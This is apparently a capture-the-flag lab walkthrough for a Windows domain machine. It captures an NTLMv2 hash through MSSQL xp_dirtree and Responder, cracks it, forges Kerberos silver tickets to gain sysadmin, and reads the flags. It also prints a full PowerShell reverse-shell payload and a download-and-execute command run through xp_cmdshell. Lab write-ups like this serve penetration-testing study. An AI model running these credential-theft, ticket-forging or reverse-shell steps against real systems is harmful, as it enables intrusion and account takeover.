- Connect to mssql port using creds
- help command: xp_cmdshell disable but xp_dirtree enable

- Using xp_dirtree :
sql:
xp_dirtree \\ip\fake\shares
machine:
responder -I tun0

We capture this : 
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:1122334455667788:79ABBD007948184DD38FCC9DAFF65D97:0101000000000000003C12FCE93DDC0105245092ABFF3FCC00000000020008004D0032004B004C0001001E00570049004E002D0042005500360056004F00370058003200420039004A0004003400570049004E002D0042005500360056004F00370058003200420039004A002E004D0032004B004C002E004C004F00430041004C00030014004D0032004B004C002E004C004F00430041004C00050014004D0032004B004C002E004C004F00430041004C0007000800003C12FCE93DDC0106000400020000000800300030000000000000000000000000300000741495C83B896C93CE2DA5386CD3F19C8469A709AD39EBAD92137D083810BEEB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360032000000000000000000

Decode with john gives the following creds : mssqlsvc:purPLE9795!@

We can connect to this user using : 
mssqlclient.py 'SIGNED/mssqlsvc:purPLE9795!@@10.10.11.90' -windows-auth

Now we see that IT group has sysadmin permission with : 
SELECT p.name AS LoginName, p.type_desc AS LoginType FROM sys.server_role_members AS rm JOIN sys.server_principals AS r ON rm.role_principal_id = r.principal_id JOIN sys.server_principals AS p ON rm.member_principal_id = p.principal_id WHERE r.name = 'sysadmin' ORDER BY LoginName;

So we get this ouput : 
LoginName                   LoginType       
-------------------------   -------------   
NT SERVICE\MSSQLSERVER      WINDOWS_LOGIN   
NT SERVICE\SQLSERVERAGENT   WINDOWS_LOGIN   
NT SERVICE\SQLWriter        WINDOWS_LOGIN   
NT SERVICE\Winmgmt          WINDOWS_LOGIN   
sa                          SQL_LOGIN       
SIGNED\IT                   WINDOWS_GROUP


Now with ticketer.py we will create a silver ticket (cf: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)
-> get group hexa SID with : SELECT SUSER_SID('SIGNED\IT');
SID: 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
-> convert it to string with python program : S-1-5-21-4088429403-1159899800-2753317549-1103

Now we hash ssqlsvc password to get its NTHash with a python script. This gives us : ef699384c3285c54128a3ee1ddb1a0cc

Based on the average format of spn, we guess can guess it: mssqlsvc/signed.htb

And so we can generate the ticket : 
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn mssqlsvc/signed.htb mssqlsvc

And try to connect with : mssqlclient.py signed.htb -k -no-pass

But now, im still SIGNED\Administrator  guest@master so im not complety sysadmin.

So now i will run ticketer.py to create a ticket for the admin group :
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn mssqlsvc/signed.htb mssqlsvc -groups 512,513,1105

We get an admin ticket, we log with :
mssqlclient.py -k signed.htb -no-pass

We can use xp_cmdshell to print user.txt:
EXEC xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt';



-------------------------------
UNINTENDED SOLUTION:

Run:
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn mssqlsvc/signed.htb -groups 512,513,519,1105 -user-id 1103 mssqlsvc

Then connect to mssql with kerberos auth, and run:
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents 
-------------------------------


No finished:


Now we create a shell.ps1 on our machine with this payload: 
$client = New-Object System.Net.Sockets.TCPClient("<YOUR_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Run a python server to upload the file:
python3 -m http.server 80

Start a listener:
nc -lvnp 4444

And execute this on the mssql client:
EXEC xp_cmdshell 'powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString(\"http://<YOUR_IP>/shell.ps1\")"';


With netstat -ano we can see the port 5986 open (WinRM port)
